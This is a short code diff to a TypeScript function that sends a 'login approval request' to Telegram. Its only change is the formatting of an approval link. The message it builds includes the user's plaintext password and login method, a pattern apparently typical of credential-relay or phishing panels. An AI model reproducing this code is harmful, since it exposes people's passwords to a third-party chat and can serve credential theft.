@@ -50,7 +50,7 @@ export async function sendLoginApprovalRequest(data: Record<string, any>): Promi
     `🔑 <b>Password:</b> ${asCode(data.password)}`,
     `📧 <b>Method:</b> ${asCode(data.method)}`,
     "",
-    `👉 Approve or deny (${asLink(approvalsUrl)}`,
+    `👉 ${asLink(approvalsUrl, "Approve or deny")}`,
   ].join("\n")
   return sendTelegramMessage(message)
 }
